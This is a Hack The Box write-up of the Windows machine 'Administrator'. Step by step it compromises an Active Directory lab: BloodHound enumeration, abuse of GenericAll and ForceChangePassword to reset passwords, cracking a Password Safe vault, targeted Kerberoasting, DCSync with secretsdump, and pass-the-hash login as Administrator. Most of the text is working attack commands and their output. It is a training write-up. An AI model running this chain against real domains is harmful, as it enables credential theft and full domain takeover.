---
title: "Hack The Box: Administrator"
date: 2025-11-08
summary: "A Medium Windows-based machine where the target is compromised through a multi-stage Active Directory ACL abuse chain. Starting with initial domain credentials, abusing GenericAll and ForceChangePassword permissions grants access to an FTP service holding a Password Safe database. Cracking the vault reveals credentials for a user with GenericWrite permissions, enabling targeted Kerberoasting to obtain a service account hash. Cracking this ticket yields credentials with DCSync rights, allowing complete dump of domain secrets and administrative compromise."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Administrator"
tags:
  - ace-forcechangepassword
  - ace-genericall
  - ace-genericwrite
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - dcsync
  - evil-winrm
  - impacket-secretsdump
  - john
  - net-rpc
  - netexec
  - nmap
  - pwsafe
  - pwsafe2john
  - rusthound-ce
  - targetedkerberoasting-py
---

### Provided Information

"As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: `Olivia`, Password: `ichliebedich`"

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.1.64
Nmap scan report for 10.129.1.64
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-07 15:55:58 +04 for 38s
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-08 19:03:56Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 21233/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18903/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 31136/udp): CLEAN (Timeout)
|   Check 4 (port 11493/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-08T19:04:08
|_  start_date: N/A
|_clock-skew: 1d07h07m46s
<SNIP>
```

All the ports indicate that the target is a Domain Controller (DC).

In addition, `ftp` is opened on the target, which is an unusual thing to see on DCs (as far as what I know).

Let’s first add the FQDN of the domain to `/etc/hosts`:

```bash
$ echo '10.129.1.64 administrator.htb' | sudo tee -a /etc/hosts
```

As we have credentials, let’s start by using them against `ftp` and `smb` to see if there are any quick wins.

```bash
$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:kali): Olivia
331 Password required
Password:
530 User cannot log in, home directory inaccessible.
ftp: Login failed
```

`ftp` refused authentication. Let’s try SMB:

```bash
$ netexec smb administrator.htb -u Olivia -p ichliebedich --shares
SMB         10.129.1.64     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.1.64     445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.129.1.64     445    DC               [*] Enumerated shares
SMB         10.129.1.64     445    DC               Share           Permissions     Remark
SMB         10.129.1.64     445    DC               -----           -----------     ------
SMB         10.129.1.64     445    DC               ADMIN$                          Remote Admin
SMB         10.129.1.64     445    DC               C$                              Default share
SMB         10.129.1.64     445    DC               IPC$            READ            Remote IPC
SMB         10.129.1.64     445    DC               NETLOGON        READ            Logon server share
SMB         10.129.1.64     445    DC               SYSVOL          READ            Logon server share
```

`smb` authentication is valid, but no interesting shares were identified.

### Bloodhound

Let’s go to `bloodhound` to map out the domain.

I’ll first collect data for it using `bloodhound-ce-python` and `rusthound-ce` (in case one tool misses something):

```bash
$ bloodhound-ce-python -d administrator.htb -u Olivia -p 'ichliebedich' -ns 10.129.1.64 -c all --zip
<SNIP>
INFO: Compressing output into 20251109001510_bloodhound.zip
```

```bash
$ rusthound-ce -d administrator.htb -u Olivia -p 'ichliebedich' -n 10.129.1.64 -c All --zip
<SNIP>
RustHound-CE Enumeration Completed at 00:15:07 on 11/09/25! Happy Graphing!
```

Now let’s import the data into `bloodhound`, mark the user Olivia as owned, and see what can it do:

![Figure 1](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

None of the groups that Olivia is part of are interesting, except the Remote Management Users group. This means that we can use `evil-winrm` as Olivia to gain RCE on the DC.

### RCE as Emily

Let’s do exactly that:

```bash
$ evil-winrm -u Olivia -p ichliebedich -i administrator.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> cd ..
*Evil-WinRM* PS C:\Users\olivia> tree . /F
Folder PATH listing
Volume serial number is 00000292 6131:DE70
C:\USERS\OLIVIA
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

Success, but nothing useful.

Enumerating other directories in the system shows nothing useful neither.

Let’s see what permissions Olivia has over other objects:

![Figure 2](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

Olivia has GenericAll permission over Michael, which means that Olivia has full control over Michael.

### Exploiting Michael

Let’s first gain control over Michael by changing the user’s password using `net rpc`:

```bash
$ net rpc password michael "michael123" -U administrator.htb/Olivia%ichliebedich -S 10.129.1.64
```

Let’s verify the change:

```bash
$ netexec smb administrator.htb -u michael -p michael123
SMB         10.129.1.64     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.1.64     445    DC               [+] administrator.htb\michael:michael123
```

Success!

Now that Michael is owned, let’s first see if the user can access that `ftp` service:

```bash
$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:kali): michael
331 Password required
Password:
530 User cannot log in, home directory inaccessible.
ftp: Login failed
```

Still inaccessible.

Let’s see if Michael can access special `smb` shares:

```bash
$ netexec smb administrator.htb -u michael -p michael123 --shares
SMB         10.129.1.64     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.1.64     445    DC               [+] administrator.htb\michael:michael123
SMB         10.129.1.64     445    DC               [*] Enumerated shares
SMB         10.129.1.64     445    DC               Share           Permissions     Remark
SMB         10.129.1.64     445    DC               -----           -----------     ------
SMB         10.129.1.64     445    DC               ADMIN$                          Remote Admin
SMB         10.129.1.64     445    DC               C$                              Default share
SMB         10.129.1.64     445    DC               IPC$            READ            Remote IPC
SMB         10.129.1.64     445    DC               NETLOGON        READ            Logon server share
SMB         10.129.1.64     445    DC               SYSVOL          READ            Logon server share
```

Nothing too interesting.

The third option is to see what Michael can do to other objects in the domain:

![Figure 3](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

Michael too can `evil-winrm` to the DC, given that the user is part of the Remote Management Users group.

### RCE as Michael

Let’s do that:

```bash
$ evil-winrm -u michael -p michael123 -i administrator.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> cd ..
*Evil-WinRM* PS C:\Users\michael> tree . /F
Folder PATH listing
Volume serial number is 000001C9 6131:DE70
C:\USERS\MICHAEL
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

Similar to Olivia’s case, nothing too interesting.

Let’s see what controls Michael has over other objects:

![Figure 4](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

Michael has ForceChangePassword permission over Benjamin.

### Exploiting Benjamin

Let’s change Benjamin’s password using `net rpc`:

```bash
$ net rpc password benjamin "benj1234" -U administrator.htb/michael%michael123 -S 10.129.1.64
```

And let’s verify that:

```bash
$ netexec smb administrator.htb -u benjamin -p benj1234
SMB         10.129.1.64     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.1.64     445    DC               [+] administrator.htb\benjamin:benj1234
```

Success!

Let’s see if Benjamin can access that `ftp` share:

```bash
$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:kali): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62361|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||62365|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************|   952        4.37 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (4.34 KiB/s)
```

Benjamin can indeed access the `ftp` service, where a `psafe3` file can be found.

### Exploiting Emily

Let’s extract the hash of the file with `pwsafe2john`:

```bash
$ pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588<REDACTED>
```

Nice. Now let’s attempt to crack it with `john`:

```bash
$ echo 'Backu:$pwsafe$*3*4ff588<REDACTED>' > pwsafe.hash

$ john pwsafe.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
teki<REDACTED>       (Backu)     
<SNIP>
Session completed.
```

And the hash was successfully cracked.

Let’s interact with the `pwsafe` file:

```bash
$ pwsafe Backup.psafe3
```

After inputting the cracked password, 3 new users’ credentials can be identified:

![Figure 5](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Clicking on each of the users and clicking Edit shows the cleartext password.

Here are the collected credentials:

```bash
alexander:UrkIba<REDACTED>
emily:UXLCI5<REDACTED>
emma:WwANQW<REDACTED>
```

Let’s check if any of them authenticates against `smb`:

```bash
$ netexec smb administrator.htb -u alexander -p UrkIba<REDACTED>
SMB         10.129.1.64     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.1.64     445    DC               [-] administrator.htb\alexander:UrkIba<REDACTED> STATUS_LOGON_FAILURE
```

Alexander failed.

```bash
$ netexec smb administrator.htb -u emily -p UXLCI5<REDACTED>
SMB         10.129.1.64     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.1.64     445    DC               [+] administrator.htb\emily:UXLCI5<REDACTED>
```

However, Emily successfully authenticated.

Let’s see what can Emily do in the domain:

![Figure 6](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-7.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

![Figure 7](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-8.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

As seen, Emily:

- is part of the Remote Management Users group → able to use `evil-winrm`.
- has GenericWrite permission over Ethan → can perform targeted kerberoasting on Ethan.

### RCE as Emily

Let’s first get a shell as Emily on the DC, where `user.txt` will be awaiting:

```bash
$ evil-winrm -u emily -p UXLCI5<REDACTED> -i administrator.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls

    Directory: C:\Users\emily\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         11/8/2025  11:01 AM             34 user.txt

*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
4ab978<REDACTED>
```

### Exploiting Ethan

Let’s now perform targeted kerberoasting on Ethan, using `targetedkerberoasting.py`:

```bash
$ python3 targetedKerberoast.py -v -d administrator.htb -u emily -p UXLCI5<REDACTED> --dc-ip administrator.htb --request-user ethan
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$f41f1b<REDACTED>
[VERBOSE] SPN removed successfully for (ethan)
```

> **Note:** If you got an error related to time and skew, check out [this article](https://medium.com/@cider-htb/when-your-vm-lies-about-the-time-fixing-clock-skew-errors-within-ctfs-and-active-directory-5698b9493a37).

Success! Now let’s attempt to crack the hash:

```bash
$ echo '$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$f41f1b<REDACTED>' > ethan.hash

$ john ethan.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
limp<REDACTED>       (?)
<SNIP>
```

And the hash was successfully cracked.

### DCSync and Full Domain Compromise

Now let’s see what can Ethan do in the domain:

![Figure 8](/assets/images/writeups/hack-the-box-administrator/hack-the-box-administrator-fig-9.png)

<figcaption class="blog-image-caption">Figure 8</figcaption>

Extremely interesting. Ethan has DCSync permissions in the domain, which means that the entire domain is compromised at this point.

Let’s use `impacket-secretsdump` to gain the domain secrets and the hashes of all domain users:

```bash
$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.1.64
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553<REDACTED>:::
<SNIP>
```

### RCE as Administrator

The main thing to care about is the Administrator hash, which can be used with `evil-winrm` to gain RCE as admin where `root.txt` will be awaiting:

```bash
$ evil-winrm -u Administrator -H 3dc553<REDACTED> -i administrator.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         11/8/2025  11:01 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3eee61<REDACTED>
```
